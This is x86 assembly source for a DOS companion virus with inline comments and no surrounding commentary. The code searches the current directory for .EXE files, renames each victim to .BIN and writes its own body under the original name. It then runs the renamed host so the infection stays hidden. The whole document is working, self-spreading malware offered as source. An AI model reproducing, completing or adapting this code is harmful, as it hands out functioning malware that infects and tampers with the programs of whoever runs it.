virus_length_file = 8192
virus_length_mem  = ((offset end_virus - offset start + 256 + 15) / 16)

.286
.model tiny
.radix 10
.code
org 0
start:
	mov es, ds:[2Ch]                ; Get enviroment block in ES
	xor di, di                      ; ES:DI=start enviroment block
	xor ax, ax                      ; al=0 for rep scasb
	mov cx, -1                      ; size of string doesn't matter
get_filename_head:                      ; search our filename in enviroment
	repne scasb                     ; search for value in al (zero)
	cmp byte ptr es:[di], 0         ; if there's another zero, it's the end
	JNE get_filename_head           ; otherwise compare next variable

	add di, 3                       ; set DI to start of our filename

	mov cs:fn_offset, di            ; save address of filename
	mov cs:fn_segment, es
	
	push ds                         ; save PSP address

	push es                         ; DS=ES (filename segement)
	pop ds
	
	mov ah, 3Dh                     ; open file (al=0 => read-only)
	mov dx, di
	int 21h                         ; open file containing virus
	
	xchg bx, ax                     ; handle in BX
	
	push cs                         ; DS=CS
	pop ds

	mov ah, 3Fh                     ; read virus file into buffer
	mov cx, virus_length_file       ; length to read
	mov dx, offset buffer           ; DS:DX=address of buffer
	int 21h
	
	mov ah, 3Eh                     ; close file
	int 21h
	
	push cs cs                      ; DS=ES=CS
	pop ds es

	mov ah, 1Ah                     ; set new DTA address
	mov dx, offset dta              ; DS:DX = Pointer to new DTA
	int 21h

	mov ah, 4Eh                     ; find first file
	xor cx, cx                      ; CX = attrib (just regular files
	mov dx, offset filemask         ; DS:DX = Pointer to filemask
search_on:
	int 21h
	JC exit                         ; if no more file found, then exit
	
	mov si, offset filename         ; copy filename
	mov di, offset filename2        ; to filename2
	mov cx, 13                      ; length of filename
	cld                             ; go upwards
	rep movsb
	
	mov di, offset filename2        ; change extension in filename2
	call change_extension           ; to .BIN

	mov ah, 56h                     ; rename file victim.exe victim.bin
	mov dx, offset filename         ; old filename
	mov di, offset filename2        ; new filename
	int 21h
	JC end_infect                   ; error if file exists, this means 
					; that the file is already infected
		
	mov ah, 5Bh                     ; create file
	xor cx, cx                      ; attribs
	mov dx, offset filename         ; victim.exe
	int 21h
	
	xchg bx, ax                     ; handle to BX
	
	mov ah, 40h                     ; write virus stuff to victim.exe
	mov cx, virus_length_file       ; length to write
	mov dx, offset buffer           ; DS:DX=our buffer
	int 21h
	
	mov ah, 3Eh                     ; close file
	int 21h

end_infect:
	mov ah, 4Fh                     ; find next file
	JMP short search_on

exit:   
	pop es                          ; restore PSP addess (block to resize)

	mov sp, offset end_virus        ; set up new stack

	mov ah, 4Ah                     ; resize MCB size
	mov bx, virus_length_mem        ; size of dos code+data+stack
	int 21h

	mov ax, es                      ; segm=ES=PSP
	mov segm, ax                    ; (segment to parameter string in PSP)
	
	mov di, fn_offset               ; restor address of our own filename
	mov es, fn_segment              ; to ES:DI
	call change_extension           ; and change file extension to .BIN
					; (our host file)

	push es                         ; DS=ES
	pop ds

	push cs                         ; ES=CS
	pop es

	mov ax, 4B00h                   ; execute host program
	mov bx, offset parameter        ; ES:BX = Pointer to parameter block
	mov dx, cs:fn_offset            ; DS:DX = Pointer to filename
	int 21h

	mov ah, 4Dh                     ; get exit code
	int 21h

	mov ah, 4Ch                     ; exit to DOS
	int 21h

; ----- END MAIN PROGRAM ----------------------------------------------------

change_extension:
; changes extension to ".BIN"; ES:DI=Pointer to filename

	mov al, '.'                     ; search for extension
	mov cl, -1                      ; will be enough
	cld
	repne scasb

.386                                    ; a 32 bit instruction follows
	mov dword ptr es:[di], "NIB"    ; change .EXE to .BIN (our host)
.286

	ret                             ; return to caller

; ----- DATA ----------------------------------------------------------------

parameter:                              ; parameter block
	   dw 0                         ; same environment as we
	   dw 80h                       ; offset parameter string (in PSP)
segm       dw 0                         ; segmet parameter string (our CS)
	   dw 4 dup(-1)                 ; addresses of FCBs (-1 => standart)

filemask   db "*.EXE", 0                ; files to search for

dta:                                    ; findfirst / findnext stuff
reserved   db 21 dup(?)
attrib     db ?
time       dw ?
date       dw ?
filesize   dd ?
filename   db 13 dup(?)                 ; the name of the victim - important!

filename2  db 13 dup(?)                 ; new filename for victim

fn_offset  dw ?                         ; where our own filename is located
fn_segment dw ?

buffer     db virus_length_file dup(?)  ; buffer to store virus file content

	   dw 100h dup(?)               ; stack space

end_virus:

end start
